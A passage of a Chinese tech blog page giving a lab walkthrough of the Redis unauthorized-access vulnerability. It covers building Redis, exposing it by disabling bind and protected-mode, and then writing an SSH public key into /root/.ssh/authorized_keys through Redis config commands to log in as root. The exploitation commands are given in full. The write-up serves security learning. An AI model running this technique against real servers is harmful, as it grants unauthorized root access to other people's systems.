+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/db/mysql/mysql数据库总结/01添加唯一索引程序在添加数据.html" class="nav-link">
+  mysql实验总结
+</a></li></ul></li><li class="dropdown-item"><h4>
+          rust语言
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/rust语言/第一阶段基础篇/01rust是什么.html" class="nav-link">
+  第一阶段基础
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="大数据" class="dropdown-title"><span class="title">大数据</span> <span class="arrow down"></span></button> <button type="button" aria-label="大数据" class="mobile-dropdown-title"><span class="title">大数据</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          hadoop基础理论
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/hadoop基本概念/阶段一/01MapReduce是什么.html" class="nav-link">
+  MapReduce理论
+</a></li></ul></li><li class="dropdown-item"><h4>
+          spark
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/02spark/01Spark集群安装与部署.html" class="nav-link">
+  spark集群
+</a></li><li class="dropdown-subitem"><a href="/lyp/大数据/scala语言基础/01scala简介.html" class="nav-link">
+  scala语言基础
+</a></li></ul></li><li class="dropdown-item"><h4>
+          zookeepre
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/zookeeper/01Zookeeper分布式集群部署.html" class="nav-link">
+  zookeepre集群
+</a></li></ul></li><li class="dropdown-item"><h4>
+          kafka
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/kafka/01Kafka集群部署与测试.html" class="nav-link">
+  kafka集群
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="美工" class="dropdown-title"><span class="title">美工</span> <span class="arrow down"></span></button> <button type="button" aria-label="美工" class="mobile-dropdown-title"><span class="title">美工</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          ps
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/美工/ps/01ps基础/01巧记ps快捷键.html" class="nav-link">
+  pa基础
+</a></li></ul></li></ul></div></div> <!----></nav>  <!----> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="header-anchor">#</a> Redis未授权访问漏洞</h1> <p>总结：</p> <p>bind 127.0.0.1 改为 bind 0.0.0.0</p> <h2 id="_01-实验环境准备"><a href="#_01-实验环境准备" class="header-anchor">#</a> 01)实验环境准备</h2> <table><thead><tr><th>ip</th> <th>描述</th></tr></thead> <tbody><tr><td>192.168.172.251</td> <td>安装redis。使用c源码编译安装。</td></tr> <tr><td>192.168.172.252</td> <td>安装redis-cli的客户端</td></tr></tbody></table> <p><img src="/assets/img/image-20240115203718928.8d35616f.png" alt="image-20240115203718928"></p> <h2 id="_02-编译-安装redis"><a href="#_02-编译-安装redis" class="header-anchor">#</a> 02)编译&amp;安装redis</h2> <p>目标：</p> <ul><li><p>在Linux中安装Redis。</p></li> <li><p>上传centos7上安装。</p></li></ul> <p><img src="/assets/img/image-20240115204243968.f310ef9c.png" alt="image-20240115204243968"></p> <p>第一步：解压安装包，命令：</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> redis-4.0.0.tar.gz <span class="token parameter variable">-C</span> /usr/local
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查看解压的目录</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token builtin class-name">cd</span> /usr/local
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20240115204347307.7e9dc64f.png" alt="image-20240115204347307"></p> <p>第二步：安装Redis的依赖环境gcc，命令：</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>yum <span class="token function">install</span> gcc-c++
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20240115204425618.7b771c10.png" alt="image-20240115204425618"></p> <p><img src="/assets/img/image-20240115204450764.2d891b3b.png" alt="image-20240115204450764"></p> <p><img src="/assets/img/image-20240115204507493.32f7dc8b.png" alt="image-20240115204507493"></p> <p>第三步：进入/usr/local/redis-4.0.0，进行编译，命令：</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code> <span class="token builtin class-name">cd</span> /usr/local/redis-4.0.0
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20240115204614864.b66ad449.png" alt="image-20240115204614864"></p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">make</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20240115204540611.50cfac71.png" alt="image-20240115204540611"></p> <p><img src="/assets/img/image-20240115204720080.eab3ecff.png" alt="image-20240115204720080"></p> <p>第四步：进入redis的src目录进行安装，命令：</p> <p><img src="/assets/img/image-20240115204856199.4af44506.png" alt="image-20240115204856199"></p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">make</span> <span class="token function">install</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>安装后重点文件说明：</p> <table><thead><tr><th style="text-align:left;">路径</th> <th>描述</th></tr></thead> <tbody><tr><td style="text-align:left;">/usr/local/redis-4.0.0/src/redis-server</td> <td>Redis服务启动脚本</td></tr> <tr><td style="text-align:left;">/usr/local/redis-4.0.0/src/redis-cli</td> <td>Redis客户端脚本</td></tr> <tr><td style="text-align:left;">/usr/local/redis-4.0.0/redis.conf</td> <td>Redis配置文件</td></tr></tbody></table> <p>如果目标系统存在未授权访问漏洞，则可以成功进行连接。输入info命令， 可以查看Redis服务的版本号、配置文件目录、进程ID号等，如下所示</p> <ul><li>编译中遇到的问题！</li></ul> <p><img src="/assets/img/image-20240115210229630.d0a5a578.png" alt="image-20240115210229630"></p> <p>解决：</p> <p>直接安装新的tcl,命令如下:</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>yum <span class="token function">install</span> <span class="token parameter variable">-y</span> tcl-devel
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>清空之前的make的缓存命令:</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">make</span> distclean
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>重新make编译命令:</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">make</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>结束后重新测试命令:</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">make</span> <span class="token builtin class-name">test</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_02-编译结果"><a href="#_02-编译结果" class="header-anchor">#</a> 02)编译结果</h2> <p><img src="/assets/img/image-20240115210133322.d31a88f2.png" alt="image-20240115210133322"></p> <ul><li>移动到另外一个目录中取</li></ul> <p><img src="/assets/img/image-20240115210545140.8c3dfa9a.png" alt="image-20240115210545140"></p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">cp</span> /usr/local/redis-4.0.0/redis.conf ./redis/
+<span class="token function">cp</span> /usr/local/redis-4.0.0/src/redis-cli ./redis/
+<span class="token function">cp</span> /usr/local/redis-4.0.0/src/redis-server ./redis/
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="/assets/img/image-20240115210823362.0821086e.png" alt="image-20240115210823362"></p> <h2 id="_03-redis开启远程连接"><a href="#_03-redis开启远程连接" class="header-anchor">#</a> 03)redis开启远程连接</h2> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment"># 允许任何主机连接、访问</span>
+<span class="token builtin class-name">bind</span> <span class="token number">127.0</span>.0.1 改为 <span class="token builtin class-name">bind</span> <span class="token number">0.0</span>.0.0
+ 
+<span class="token comment"># 关闭保护模式</span>
+protected-mode <span class="token function">yes</span> 改为 protected-mode no
+ 
+<span class="token comment"># 允许启动后在后台运行，即关闭命令行窗口后仍能运行</span>
+daemonize no 改为 daemonize <span class="token function">yes</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>启动</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-server ./redis.conf
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20240115212300004.858350b7.png" alt="image-20240115212300004"></p> <h2 id="_04另外一台机子连接redis"><a href="#_04另外一台机子连接redis" class="header-anchor">#</a> 04另外一台机子连接redis</h2> <p><img src="/assets/img/image-20240115212628836.ef3a4a4a.png" alt="image-20240115212628836"></p> <h2 id="_05-漏洞利用"><a href="#_05-漏洞利用" class="header-anchor">#</a> 05)漏洞利用</h2> <p>当与远程Redis建立好连接后，通过Redis指令就能查询所需要的敏感信息。 下面就Redis一些常用指令进行简单介绍：</p> <p>查看key和其对应的值</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>keys *
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>获取用户名</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>get user
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20240115212914215.a6bd677b.png" alt="image-20240115212914215"></p> <p>获取目标权限的常规利用方式</p> <p>在本地主机生成密钥key的命令如下</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code> ssh-keygen <span class="token parameter variable">-t</span> rsa
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20240115213330569.9bb9158f.png" alt="image-20240115213330569"></p> <p>在目录/root/.ssh下查看生成结果，并将公钥导入txt文件中，命令如下</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin class-name">cd</span> /root/.ssh
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token function">ls</span>
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">&quot;<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&quot;</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">&quot;<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&quot;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> key.txt
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token function">cat</span> /root/key.txt
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><img src="/assets/img/image-20240115213545745.ddefe54b.png" alt="image-20240115213545745"></p> <p>将txt文件中的公钥导入Redis缓存中，命令如下:</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">cat</span> /root/key.txt <span class="token operator">|</span> redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.172.251
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/image-20240115214205569.32d09e17.png" alt="image-20240115214205569"></p> <p>连接到目标主机，更改配置文件路径为/root/.ssh，设定文件名称为 authorized-keys，代码如下</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.172.251
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh
+Config <span class="token builtin class-name">set</span> dbfilename authorized_keys
+save
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/assets/img/image-20240115214603176.e7851560.png" alt="image-20240115214603176"></p> <p>执行这个命令前对方电脑也要有响应的/root/.ssh目录。</p> <p><img src="/assets/img/image-20240115214720919.3ac6ccde.png" alt="image-20240115214720919"></p> <p><img src="/assets/img/image-20240115214744844.52d5c2ce.png" alt="image-20240115214744844"></p> <h2 id="_06-远程登入目标主机"><a href="#_06-远程登入目标主机" class="header-anchor">#</a> 06)远程登入目标主机</h2> <p>通过SSH协议连接到远程目标主机，命令如下：</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">ssh</span> <span class="token number">192.168</span>.172.251
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>运行结果连接到目标主机，如下所示</p> <p><img src="/assets/img/image-20240115214840074.320c30f2.png" alt="image-20240115214840074"></p></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated:</span> <span class="time">5/17/2024, 2:50:34 PM</span></div></footer> <!----> </main></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.163c86d3.js" defer></script><script src="/assets/js/2.44dd0d1f.js" defer></script><script src="/assets/js/7.413f6afe.js" defer></script>
+  </body>
+</html>
